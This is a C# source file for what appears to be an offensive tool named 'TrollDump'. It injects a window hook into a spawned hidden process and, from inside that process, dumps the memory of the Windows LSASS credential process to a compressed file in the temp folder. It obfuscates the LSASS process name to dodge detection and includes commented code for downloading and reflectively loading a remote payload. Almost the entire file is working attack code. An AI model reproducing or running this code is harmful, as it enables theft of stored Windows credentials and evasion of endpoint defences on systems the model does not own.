using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;


namespace TrollDump
{
    public class ForFun

    {

        #region DLLExport

        public static void RunOnRemoteProcess()
        {
            System.IO.File.WriteAllText(HookCheck, "hook activated");
            Dump();

            //alternatively just reflectively load payload
            //payload can be stored here as byte array or put on disk (for convenience testing)
            //var payload = download from internet as byte
            //Assembly asm = System.Reflection.Assembly.Load(payload);
            //Assembly asm = System.Reflection.Assembly.LoadFrom(@"C:\Users\public\Dump.exe");
            //asm.EntryPoint.Invoke(null, null);

        }

        public static void Dump()
        {
            string dumpFile = @"c:\windows\temp\tr0ll.out";
            string zipfile = @"c:\windows\temp\tr0ll.zip";

            uint targetProcessId = (uint)Process.GetProcessesByName("l" + "s" + "ass")[0].Id;

            Process targetProcess = Process.GetProcessById((int)targetProcessId);
            IntPtr targetProcessHandle = targetProcess.Handle;

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            if(File.Exists(zipfile)) System.IO.File.Delete(zipfile);

            var bytes = System.IO.File.ReadAllBytes(dumpFile);
            using (FileStream fs = new FileStream(zipfile, FileMode.CreateNew))
            {
                using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                {
                    zipStream.Write(bytes, 0, bytes.Length);
                }
            }

            System.IO.File.Delete(dumpFile);

        }

        [DllExport]
        public static IntPtr HookProc(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            if (lParam != IntPtr.Zero)
            {
                var cwp = (CWPSTRUCT)Marshal.PtrToStructure(lParam, typeof(CWPSTRUCT));
                if (cwp.message == InjectorMessage)
                {
                    // run the code in a new task to avoid to block the SendMessage because SendMessage does not return till this is completed
                    Task.Factory.StartNew(() => {
                        RunOnRemoteProcess();
                        UnhookWindowsHookEx(hookHandle);
                    });

                    //alternatively can use thread class
                }
            }

            return CallNextHookEx(hookHandle, code, wParam, lParam);
        }


        [StructLayout(LayoutKind.Sequential)]
        internal struct CWPSTRUCT
        {
            public IntPtr lparam;
            public IntPtr wparam;
            public int message;
            public IntPtr hwnd;
        }

        #endregion


        #region GlobalVariables
        public enum InjectionResult : Int32
        {
            Success = 0,
            InjectionFailed = 1,
            WindowThreadNotFound = 2,
            PidNotValid = 5,
            UnknownError = 6,

        }

        public static string HookCheck = @"c:\windows\temp\hook.txt";
        //public static string _Pname = @"C:\Windows\system32\taskmgr.exe";
        public static string _Pname;
        public static Int32 _pid = 0;
        public static Process _process = null;
        public static IntPtr _processHandle = IntPtr.Zero;
        public static String _lastErrorMessage = String.Empty;
        public const Int32 WH_CALLWNDPROC = 4;
        public static readonly Int32 InjectorMessage = RegisterWindowMessage("troll");
        public static IntPtr hookHandle = IntPtr.Zero;

        #endregion




        public static IntPtr[] GetProcessWindows(Int32 pid)
        {
            // Yes, I copied this piece of code from StackOverFlow
            // src: https://stackoverflow.com/a/25152035/1422545
            var apRet = new List<IntPtr>();
            var pLast = IntPtr.Zero;
            var currentPid = 0;

            do
            {
                pLast = FindWindowEx(IntPtr.Zero, pLast, null, null);
                GetWindowThreadProcessId(pLast, out currentPid);

                if (currentPid == pid)
                    apRet.Add(pLast);

            } while (pLast != IntPtr.Zero);

            return apRet.ToArray();
        }


        public static IntPtr InjectIntoThread(UInt32 threadId)
        {
            var thisModule = typeof(ForFun).Module;
            var moduleHandle = GetModuleHandle(thisModule.Name);
            Console.WriteLine("Obtained Handle for typeof(ForFun).Module: " + moduleHandle);

            // get addr exported function
            var hookProc = GetProcAddress(moduleHandle, "HookProc");
            Console.WriteLine("Obtained ProcAddress for hookProc: " + hookProc);

            IntPtr x = SetWindowsHookEx(WH_CALLWNDPROC, hookProc, moduleHandle, threadId);
            System.Console.WriteLine("SetWindowsHookEx return result: " + GetLastError());

            return x;
        }

        public static void ActivateHook()
        {

            Int32 result = SendMessage(_processHandle, InjectorMessage, IntPtr.Zero, IntPtr.Zero);
            System.Console.WriteLine("SendMessage result: " + result);
        }

        public static void SpawnProcess(string Pname)
        {
            //spawn process newcreatedprocess
            Process newcreatedprocess = new Process();

            // Setup executable and parameters
            newcreatedprocess.StartInfo.FileName = Pname;

            // Stop the process from opening a new window
            newcreatedprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            // Oddly, setting the additional parameters make the window visible
            // newcreatedprocess.StartInfo.RedirectStandardOutput = true;
            // newcreatedprocess.StartInfo.UseShellExecute = false;
            // newcreatedprocess.StartInfo.CreateNoWindow = true;
            // newcreatedprocess.process.StartInfo.Arguments = "";


            //Go
            newcreatedprocess.Start();
            _pid = newcreatedprocess.Id;
            System.Threading.Thread.Sleep(100);
            Console.WriteLine("New process spawned with PID = " + _pid);

        }

        public static void KillSpawnedProcess()
        {
            Console.WriteLine("Killing spawned process in 5 seconds..");
            System.Threading.Thread.Sleep(5000);
            Process.GetProcessById(_pid).Kill();
            Console.WriteLine("Killed spawned process");
        }




        public static void Main(string _Pnamearg)
        {

            _Pname = _Pnamearg;

            SpawnProcess(_Pname);


            //If target process already RUNNING 
            //var processes = Process.GetProcessesByName("whatever.exe");
            //_pid = processes[0].Id;
            //_pid = 5680;               //else it can be hardcoded also


            if (_pid != 0)
            {

                Console.WriteLine("Injecting into: " + _pid);
                var InjectionResult = Inject();
                Console.WriteLine("InjectionResult: " + InjectionResult);

            }
            else
            {
                Console.WriteLine("Error with spawning new process");
            }

            if (File.Exists(HookCheck))
            {
                Console.WriteLine("Remote process succeeded to call hook");
                File.Delete(HookCheck);
            }
            else
            {
                Console.WriteLine("Remote process failed to call hook");
            }

            KillSpawnedProcess();

        }

        public static InjectionResult Inject(Object context = null)
        {
            var result = InjectionResult.UnknownError;


            if (Process.GetProcessById(_pid) != null)
            {

                try
                {

                    bool runOnce = true;

                    UInt32 threadId = 0;
                    foreach (var windowHandle in GetProcessWindows(_pid))
                    {
                        if (runOnce)
                        {

                            _processHandle = windowHandle;
                            threadId = GetWindowThreadProcessId(windowHandle, IntPtr.Zero);

                            if (threadId > 0)
                            {
                                Console.WriteLine("OBtained threadId to Inject: " + threadId);

                                runOnce = false;

                                hookHandle = InjectIntoThread(threadId);

                                if (hookHandle != IntPtr.Zero)
                                {
                                    ActivateHook();        //trigger hookproc
                                    result = InjectionResult.Success;
                                }
                                else
                                {
                                    result = InjectionResult.InjectionFailed;
                                }
                            }
                            else
                            {
                                result = InjectionResult.WindowThreadNotFound;
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    result = InjectionResult.InjectionFailed;
                    _lastErrorMessage = e.ToString();
                }
            }

            return result;
        }



        #region PInvoke

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr SetWindowsHookEx(Int32 idHook, IntPtr callback, IntPtr hInstance, UInt32 threadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr CallNextHookEx(IntPtr idHook, Int32 nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern UInt32 GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern Int32 SendMessage(IntPtr hWnd, Int32 wMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern Int32 RegisterWindowMessage(String lpString);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindowEx(IntPtr parentWindow, IntPtr previousChildWindow, string windowClass, string windowTitle);

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr window, out int process);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, String procName);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();


        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        //[DllImport("user32.dll", CharSet = CharSet.Unicode)]
        //private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        //[DllImport("user32.dll")]
        //[return: MarshalAs(UnmanagedType.Bool)]
        //private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);



        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr LoadLibrary(String lpFileName);

        #endregion

        #region unusedcode
        public static void HideWindow()
        {
            //Alternatively Hide window after it spawns
            //bool stuck = true;
            //IntPtr winhandle = IntPtr.Zero;
            //while (stuck)
            //{
            //    try
            //    {
            //        winhandle = FindWindow(null, "Task Manager");
            //        if (winhandle != IntPtr.Zero) {
            //            ShowWindow(winhandle, 0);
            //            stuck = false;
            //        }
            //    }
            //    catch (Exception e) { }

            //}
        }

        #endregion

    }

}
